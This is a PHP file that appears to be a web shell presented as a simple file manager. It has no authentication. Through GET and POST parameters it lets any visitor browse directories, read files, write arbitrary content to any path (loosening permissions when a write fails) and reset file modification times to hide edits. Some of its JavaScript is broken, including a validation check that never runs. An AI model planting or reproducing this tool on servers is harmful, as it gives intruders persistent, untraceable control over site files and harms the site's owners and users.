<style type="text/css">
	body {
		overflow: hidden;
	}
	iframe {
		overflow: auto;
	}
</style>
<?php
function files($path) {
	$message = null;
	$dnum = 0;
	$fnum = 0;
	if (!empty($_POST['file'])) {
		$intime = @strtotime($_POST['ftime']);
		$message = fwritte($_POST['file'], $_POST['data'], 'wb') ? 
					'edit file' .$_POST['file']. 'success' : 
					'edit file' .$_POST['file']. 'failed';
		@touch($_POST['file'], $intime);
	}
	?>
	<script type="text/javascript">
		
	</script>
	<?php
	print($message);
	foreach (scandir($path) as $key => $value) {
		if (is_dir($value)) {
			?>
			<a href="?action=filemanager&path=<?= getcwd() .'/'. $value ?>"><?= $value ?></a><br>
			<?php
		}
	}
	foreach (scandir($path) as $key => $value) {
		if (is_file($value)) {
			?>
			<a href="?action=edit&dir=<?=getcwd()?>&filename=<?=$value?>"><?=$value?></a> <br>
			<?php
		}
	}
}
function freadd($filename) {
	return file_get_contents($filename);
}
function fwritte($filename, $data, $fmode) {
	$key = true;
	$handle = fopen($filename, $fmode);
	if (!@fwrite($handle, $data)) {
		@chmod($filename, 0666);
		$key = @fwrite($handle, $data) ? true : false;
	}
	fclose($handle);
	return $key;
}
function fedit($path, $filename, $dim ='') {
	$thispath = urlencode($path);
	$thisfile = $path . DIRECTORY_SEPARATOR . $filename;
	if (file_exists($thisfile)) {
		$ftime = @date("Y-m-d H:i:s", filemtime($thisfile));
		$fcode = htmlspecialchars(freadd($thisfile));
	} else {
		$ftime = date("Y-m-d H:i:s", time());
		$fcode = '';
	}
	?>
	<script language="javascript">
		var NS4 = (document.layers);
		var IE4 = (document.all);
		var win = this;
		var n = 0;
		function search(str){
			var txt, i, found;
			if(str == "")return false;
			if(NS4){
				if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
				if(n == 0) alert(str + " ... Not-Find")
			}
			if(IE4) {
				txt = win.document.body.createTextRange();
				for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
					txt.moveStart("character", 1);
					txt.moveEnd("textedit")
				}	
				if(found){
					txt.moveStart("character", -1);
					txt.findText(str);
					txt.select();
					txt.scrollIntoView();
					n++
				}
				else { 
					if (n > 0) {
						n = 0;
						search(str)
					}
					else 
						alert(str + "... Not-Find")
				}
			} 
			return false
		}
		function CheckDate(){
			var re = document.getElementById('ftime').value;
			var reg = "/^(d{1,4})(-|/)(d{1,2})2(d{1,2}) (d{1,2}):(d{1,2}):(d{1,2})$/"; 
			var r = re;
			if(r==null) {
				alert('Date format is incorrect! Format:yyyy-mm-dd hh:mm:ss');
				return false;
			}
			else {
				document.getElementById('editor').submit();
			}
		}
	</script>
	<input name="searchs" type="text" value="<?=$dim?>">
	<input type="button" value="search" onclick="search(searchs.value)">
	<form method="POST" id="editor" action="?action=filemanager&path=<?=$thisfile?>">
		<input type="text" name="file" value="<?=$thisfile?>">
		<textarea name="data" id><?=$fcode?></textarea>
		File modification time 
		<input type="text" name="ftime" id="ftime" value="<?= $ftime ?>">
		<input type="button" value="save" onclick="CheckDate();">
		<input type="button" value="back" onclick="window.location='?s=a&p={$THIS_DIR}';">
	</form>
	<?php
}
function home() {
	?>
	<script type="text/javascript">
		function switchtab(tab) {
			if (tab =='') return false;
			for (var i = 1; i <= 10; i++) {
				if (tab == 'tab' +i) {
					document.getElementById(tab).style.background = '#fff';
				} else {
					document.getElementById(tab).style.background = '#000';
				} return true;
			}
	</script>
		<a href="?action=filemanager" id="tab1" onclick="switchtab('tab1')" target="main">Filemanager</a>
	<iframe name="main" src="?action=filemanager" width="100%" height="100%" frameborder="0"></iframe>
	<?php
}
if (isset($_GET['path'])) {
	@chdir($_GET['path']);
}

switch (@$_GET['action']) {
	case 'filemanager':
		files(getcwd());
		break;
	case 'edit':
		fedit($_GET['dir'], $_GET['filename']);
		break;
	default:
		home();
		break;
}
?>
